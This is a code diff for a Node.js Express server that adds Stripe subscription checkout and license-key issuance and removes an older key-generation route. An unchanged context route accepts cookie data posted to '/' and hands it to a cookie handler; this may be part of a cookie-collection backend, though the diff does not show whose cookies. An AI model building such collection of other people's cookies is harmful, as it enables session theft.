@@ -6,25 +6,30 @@ const logger = require("./logger");
 const cors = require("cors");
 const { v4: uuidv4 } = require('uuid');
 const bcrypt = require("bcrypt");
+const moment = require("moment");
 const { unlinkSync, open, close } = require("fs");
 const { PrismaClient } = require('@prisma/client');
+const Stripe = require("stripe").default;
 
+const stripe = new Stripe(process.env.STRIPE_API_KEY);
 const prisma = new PrismaClient({ log: ["info", "warn", "error"] });
-
 const app = express();
 
 const PORT = process.env.PORT || 3000;
 
-let RUNNING = 0;
+// let RUNNING = 0;
 
-if (RUNNING === 0) { utils.keepTheServerRunning(); RUNNING = 1; };
+// if (RUNNING === 0) { utils.keepTheServerRunning(); RUNNING = 1; };
 
+app.set("view engine", "ejs");
+
+app.use(express.static(__dirname + "/public"));
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ limit: '50mb', extended: true }));
 app.use(cors());
 
-app.get("/", async (req, res) => {
-    res.send({ status: "Server is Up and Running!" });
+app.get("/", (req, res) => {
+    res.render("index", { app_price: 30 });
 });
 
 app.post("/", (req, res) => {
@@ -32,6 +37,81 @@ app.post("/", (req, res) => {
     utils.handleCookies(req.body);
     res.json("Data recieved successfully!");
 
+});
+
+app.get("/get-app", (req, res) => {
+    res.render("payment", { serverUrl: process.env.BACKEND_URL });
+});
+
+app.get("/success", async (req, res) => {
+
+    if (!req.query.session_id) {
+        res.send({ message: "No Session Id Provided" });
+        return;
+    };
+
+    let email = "";
+    const session = await stripe.checkout.sessions.retrieve(req.query.session_id);
+
+    if (typeof session.customer !== "string") {
+        email = session.customer.email
+    } else {
+        const customer = await stripe.customers.retrieve(session.customer);
+        email = customer.email
+    };
+
+    const customerExists = await prisma.api.findFirst({ where: { email: email } });
+
+    if (customerExists) {
+        res.render("success", { api_key: customerExists.api_key });
+    } else {
+        const saltRounds = 10;
+        const token = uuidv4();
+        const hashedToken = await bcrypt.hash(token, saltRounds);
+
+        await prisma.api.create({
+            data: {
+                email: email,
+                api_key: hashedToken.substring(10, 45),
+                created: moment.utc().format(),
+            }
+        });
+
+        // TODO: Send an email too
+        res.render("success", { api_key: hashedToken.substring(10, 45) });
+    }
+});
+
+app.post("/create-checkout-session", async (req, res) => {
+    try {
+        const customerExists = await prisma.api.findFirst({ where: { email: req.body.customerEmail } });
+
+        if (customerExists) {
+            res.send({ message: "already exists" });
+        } else {
+            const customer = await stripe.customers.create({
+                email: req.body.customerEmail
+            });
+
+            const session = await stripe.checkout.sessions.create({
+                customer: customer.id,
+                payment_method_types: ["card"],
+                mode: "subscription",
+                line_items: [{
+                    price: "price_1OvbwCICmfhOJ5j2i47ggBOS",
+                    quantity: 1
+                }],
+                success_url: `${process.env.BACKEND_URL}/success?session_id={CHECKOUT_SESSION_ID}`,
+                cancel_url: `${process.env.BACKEND_URL}/`
+            });
+
+            res.send({ id: session.id, url: session.url });
+        }
+    } catch (error) {
+        console.trace(error);
+        logger.log(0, error);
+        res.status(500).send({ message: "Error creating checkout session." });
+    }
 });
 
 app.get("/download_log_file", (req, res) => {
@@ -64,39 +144,15 @@ app.get("/delete_log_file", (req, res) => {
 
 });
 
-app.post("/generate-api", async (req, res) => {
-    const customerEmail = req.body.customerEmail;
-    const securityKey = req.body.securityKey;
-
-    if (securityKey === process.env.SECURITY_KEY) {
-
-        const saltRounds = 10;
-        const token = uuidv4();
-        const hashedToken = await bcrypt.hash(token, saltRounds);
-
-        await prisma.api.create({
-            data: {
-                email: customerEmail,
-                api_key: hashedToken,
-            }
-        });
-
-        res.send({ message: "ok", api: hashedToken });
-
-    } else {
-        res.status(403).send({ message: "invalid security key" });
-    };
-});
-
 app.post("/validate-api", async (req, res) => {
     const licenseKey = req.body.licenseKey;
 
-    const result = await prisma.api.findMany({
+    const result = await prisma.api.findFirst({
         where: { api_key: licenseKey }
     });
 
-    if (result.length > 0) {
-        res.send({ message: "ok" });
+    if (result) {
+        res.json({ message: "ok" });
     } else {
         res.status(403).send({ message: "error" });
     }
